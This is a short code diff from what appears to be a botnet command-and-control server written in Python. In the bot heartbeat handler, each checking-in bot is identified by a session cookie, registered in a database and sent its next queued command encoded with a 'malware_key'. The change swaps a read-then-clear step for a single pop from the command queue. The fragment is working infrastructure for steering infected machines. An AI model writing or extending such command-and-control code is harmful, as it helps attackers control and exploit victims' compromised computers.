@@ -51,9 +51,8 @@ def heartbeat():
             id = request.cookies['X-Session-ID']
             db.add_bot_to_db(conn, id, checkin) # just in case bot isn't in DB (old bot reconnecting)
             db.checkin(conn, id)
-            command = dbget.get_bot_commandqueue(conn, id)[0]
+            command = dbget.pop_bot_queuedcommand(conn, id)
             if command != "":
-                db.update_commandqueue(conn, id, "")
                 return mal_encode(app.malware_key, command)
 
             """
